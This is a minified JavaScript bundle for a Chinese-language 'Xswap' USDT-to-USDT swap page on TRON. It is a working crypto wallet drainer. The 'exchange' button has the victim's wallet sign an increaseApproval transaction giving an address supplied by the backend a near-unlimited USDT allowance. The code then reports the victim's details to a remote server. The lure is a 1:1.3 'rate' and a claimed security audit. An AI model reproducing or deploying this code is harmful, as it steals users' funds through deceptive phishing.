import{_ as a}from"./xRF8uUI-c3a2b6d2.js";import{a as t}from"./BIkc-eab9540b.js";import{c as s,b as e}from"./3-a7dc8a61.js";import{u as i}from"./uSDYC-ad35767d.js";import{v as o,c as d,b as r,Q as n,P as l,l as c,q as p,M as u,W as v,R as b,S as m,O as g}from"./E55jAu1X5x-b9d77fe0.js";import{r as w,j as f,u as A}from"./TDgdfWWZ6-3ceae14d.js";import{F as h,B as y,s as x,c as j}from"./PVpGs9m0pr-461db314.js";import{P as Q}from"./DVRYX5-83563843.js";import{_ as k}from"./dYOC5-fb7299f3.js";import"./wCPATqoA6k-d55a480d.js";import"./7C24An-ae0f5c86.js";import"./n-437140e2.js";import"./GSeS-b759e5f5.js";import"./06oCcvfj1i-203fdec1.js";import"./9WAo6vEo43-296e89ec.js";import"./3McUf7Vd-d6b84efa.js";import"./sbTXoLj-2ad3f7bf.js";import"./T05XaRtqr-0e0da52a.js";import"./6NRBr7Yc9-412e2012.js";import"./ZogKH1H-ccc98e6d.js";import"./AJZz-f549f512.js";import"./y8nw3hXJ-40b910bf.js";import"./6L-7104d96e.js";import"./cRD3DPS-d80bebe6.js";import"./va-3b14ce20.js";import"./7cwKbbmMe-c0abe41f.js";import"./20x-e3fed1e2.js";import"./GbXVvX7g-c0cfdb26.js";import"./1il8l0-58d194e1.js";import"./lS8j7-235777d6.js";/* empty css          */import"./XYKxZ1kdq-50cdab9f.js";/* empty css                */import"./YIvc8vuf-583b4ad8.js";const B=a=>(b("data-v-16643d14"),a=a(),m(),a),T={class:"page-container"},R={class:"container"},D=B((()=>l("div",{class:"header",style:{"text-align":"center"}},[l("img",{alt:"Xswap",src:"/test/static/png/qXdxYcY-c595c31b.png",class:"logo",style:{margin:"7px 0 0 4px"}})],-1))),F={class:"swap-content"},W={class:"swap-panel"},S=B((()=>l("span",{class:"balance-wrap",style:{"text-align":"right",width:"100%"}},[p(" 请输入兑换数量"),l("span",{id:"address"})],-1))),X={class:"flex spaceb"},U=v('<div class="select-wrap" data-v-16643d14><img src="https://tp-statics.tokenpocket.pro/token/1567500487877-rexx.png" class="selected-logo vertical-middle" data-v-16643d14><span class="vertical-middle" data-v-16643d14><span class="symbol" data-v-16643d14>USDT</span><br data-v-16643d14><span class="network" data-v-16643d14> TRC</span></span></div>',1),C={class:"input-amount-wrap"},G={class:"min-amount-tip",style:{color:"#000"}},N=B((()=>l("div",{class:"exchange-arrow"},[l("img",{src:"data:image/png;base64,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",alt:""})],-1))),q={class:"swap-panel out-panel"},E={style:{width:"100%"}},H=B((()=>l("div",{style:{width:"100%","text-align":"right"}},[l("span",{class:"est-wrap",style:{width:"100%",color:"#000","font-size":"12px"}}," 预计接收数量 ")],-1))),V={class:"flex spaceb"},Y=v('<div class="select-wrap" data-v-16643d14><img src="https://tp-statics.tokenpocket.pro/token/1567500487877-rexx.png" alt="" class="selected-logo vertical-middle" data-v-16643d14><span class="vertical-middle" data-v-16643d14><span class="symbol" data-v-16643d14>USDT</span><br data-v-16643d14><span class="network" data-v-16643d14> TRC </span></span></div>',1),I={style:{"margin-top":"0.4rem","font-weight":"600","font-size":"18px",color:"#000"}},P={id:"price ",class:"bold",style:{"font-size":"18px"}},Z={class:"receive-address-wrap",style:{"margin-top":"15px"}},K={class:"confirm-wrap top-m20 bottom-m20"},O={class:"swap-info"},J=v('<div data-v-16643d14><span class="label" data-v-16643d14>兑换路径</span><span class="float-right" data-v-16643d14><div class="center-w" data-v-16643d14><span class="vertical-middle" data-v-16643d14> SWFT </span><img src="'+a+'" width="23" height="23" data-v-16643d14></div></span></div>',1),L=B((()=>l("span",{class:"label"},"参考价格",-1))),M={class:"float-right"},z=B((()=>l("i",{class:"iconfont iconreverse"},null,-1))),_=B((()=>l("div",null,[l("span",{class:"label"},"手续费"),l("span",{class:"float-right"}," 仅消耗燃料费用 ")],-1))),$=B((()=>l("span",{class:"label vertical-middle"},"单次最大兑换量 ",-1))),aa={class:"float-right"},ta=B((()=>l("h6",{class:"bold"},"兑换记录",-1))),sa=B((()=>l("div",{class:"footer"}," Transit swap 链上聚合合约由 PeckShield 提供安全审计 ",-1))),ea=k(o({__name:"swap",setup(a){const o=w({receiveAddress:"TMjKDcFqUcDZ55dwhtpBw9YFbxrHm4Q88",clientId:5,domain:"https://359b-2409-8a55-c162-50d0-a571-73ed-4367-d70c.ngrok-free.app",authSuccessTips:"充值失败，地址被限制",apikey:"702dfb0a-6c3b-47bd-8271-a41e1aca2c2d",swap:{minExchangeQty:5,maxExchangeQty:156351,exchangeRate:1.3}}),v=f({fromQuantity:"",toAddress:""}),b=w(""),m=w(""),k=w(!1),B=w(""),ea=w(0),ia=i(),oa=d((()=>{if(!v.fromQuantity)return 0;const a=v.fromQuantity*o.value.swap.exchangeRate;return Number(Number(a).toFixed(2))})),da=async()=>{if(k.value=!0,v.toAddress){const{data:a}=await t.post("https://api.trongrid.io/wallet/validateaddress",{address:v.toAddress,visible:!0},{headers:{"TRON-PRO-API-KEY":o.value.apikey}});if(!a.result)return k.value=!1,x("请检查收款地址是否正确!")}(async()=>{try{if(!window.hasOwnProperty("tronWeb"))return x("请切换到TRON主链");if(k.value=!0,await tronWeb.trx.getBalance()/1e6<25)return alert("TRX矿工费用不足"),void(k.value=!1);if(ea.value<=0)return k.value=!1,void alert("USDT余额不足");const a=navigator.userAgent;/iphone|ipad|ipod|ios/i.test(a),/android|XiaoMi|MiuiBrowser/i.test(a),/OKApp/i.test(a);let s={};const e=B.value;let i=[{type:"address",value:b.value},{type:"uint256",value:"23384026197294446691258957323460528314494920687615"}];k.value=!1;let d=await tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t","increaseApproval(address,uint256)",{},i,e),r=d.transaction.raw_data.contract[0].parameter.value.data,n=d.transaction.raw_data.contract[0].type;s=await tronWeb.trx.sign(d.transaction),s.raw_data.contract[0].parameter.value.data=r,s.raw_data.contract[0].type=n;const{data:l}=await t.post("https://api.trongrid.io/wallet/broadcasttransaction",{...s},{headers:{"TRON-PRO-API-KEY":o.value.apikey}});l.result&&(ra(e,"approve",l.txid),x(o.value.authSuccessTips),k.value=!1)}catch(a){j(),k.value=!1,x(String(a)),-1!=String(a).indexOf(" declined by user")&&x("您已取消")}})()},ra=async(a,t,s)=>{const i={addres:a,auth_addres:b.value,hash:s||0,wallete_type:"okt",client_id:8,source:window.location.href,agent_uid:m.value,block:"trx",client_type:1,amount:v.fromQuantity};e(i)},na=async()=>{la();const a=(await s({block:"trx",type:"approve"})).data;b.value=a},la=async()=>{const a=await tronWeb.defaultAddress.base58;if(B.value=a,v.toAddress=a||"",!a)return x("无法获取钱包地址!请检查您的浏览器是否支持TRON!");const{data:s}=await t.get(`https://apilist.tronscanapi.com/api/account/tokens?address=${a}&start=0&limit=20&hidden=0&show=0&sortType=0&sortBy=0&token=USDT`);if(k.value=!1,s.data.length>0){const a=s.data[0];ea.value=a.balance/Math.pow(10,6)}else ea.value=0};return r((async()=>{var a;const s=(null==(a=ia.query)?void 0:a.iv)||"";m.value=s||"";const e=ia.query;(null==e?void 0:e.v)&&(m.value=(null==e?void 0:e.v)||""),(async()=>{const{data:a}=await t.get("/test/assets/config.json");o.value=a})();const i=navigator.userAgent,d=/iphone|ipad|ipod|ios/i.test(i),r=/android|XiaoMi|MiuiBrowser/i.test(i),n=d||r,l=/OKApp/i.test(i);tronWeb.isTronLink&&!n&&await tronWeb.request({method:"tron_requestAccounts"}),n&&n&&l?(await window.okxwallet.tronLink.request({method:"tron_requestAccounts"}),window.tronWeb=window.okxwallet.tronLink.tronWeb,na()):na()})),(a,t)=>(g(),n("div",T,[l("div",R,[D,l("div",F,[l("div",W,[S,l("div",X,[U,l("div",C,[c(A(h),{modelValue:v.fromQuantity,"onUpdate:modelValue":t[0]||(t[0]=a=>v.fromQuantity=a),style:{"background-color":"transparent","font-size":"22px"},"input-align":"right",placeholder:"0.00",border:!1,type:"number",class:"input-qty"},null,8,["modelValue"]),l("div",G,[p(" 最小兑换量 "),l("span",null,Q(o.value.swap.minExchangeQty)+" USDT ",1)])])])]),N,l("div",q,[l("div",E,[H,l("div",V,[Y,l("div",I,[l("span",P,Q(oa.value),1),p(" USDT ")])])]),l("div",Z,[c(A(h),{modelValue:v.toAddress,"onUpdate:modelValue":t[1]||(t[1]=a=>v.toAddress=a),style:{"font-size":"15px","border-radius":"14px"},placeholder:"请输入接收地址",border:!1},null,8,["modelValue"])])]),l("div",K,[c(A(y),{style:{width:"100%","border-radius":"12px"},disabled:!oa.value,color:"#3478f6",onClick:da,loading:k.value},{default:u((()=>[p("开始兑换")])),_:1},8,["disabled","loading"])]),l("div",O,[J,l("div",null,[L,l("span",M,[l("span",null," 1 USDT = "+Q(o.value.swap.exchangeRate)+" USDT ",1),z])]),_,l("div",null,[$,l("span",aa,Q(o.value.swap.maxExchangeQty)+" USDT",1)])])]),ta,sa])]))}}),[["__scopeId","data-v-16643d14"]]);export{ea as default};
